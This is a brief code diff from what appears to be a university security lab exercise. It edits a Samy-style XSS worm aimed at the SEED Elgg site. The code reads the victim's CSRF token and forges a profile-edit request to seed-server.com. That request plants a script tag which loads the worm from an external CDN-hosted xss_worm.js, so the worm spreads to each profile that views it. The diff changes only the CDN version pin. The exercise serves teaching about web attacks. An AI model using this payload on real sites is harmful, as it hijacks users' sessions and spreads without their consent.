@@ -8,7 +8,7 @@ window.onload = function(){
   	var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	
 	//Construct the content of your url.
-	var description = "&description= <script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@5a08f9e\/xss_worm.js\"><\/script>" + "&accesslevel[description]=2";
+	var description = "&description= <script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@V1\/xss_worm.js\"><\/script>" + "&accesslevel[description]=2";
 	var content = ts + token + userName + description + guid;
 	var samyGuid = 59;
 	var sendurl = "http://www.seed-server.com/action/profile/edit";
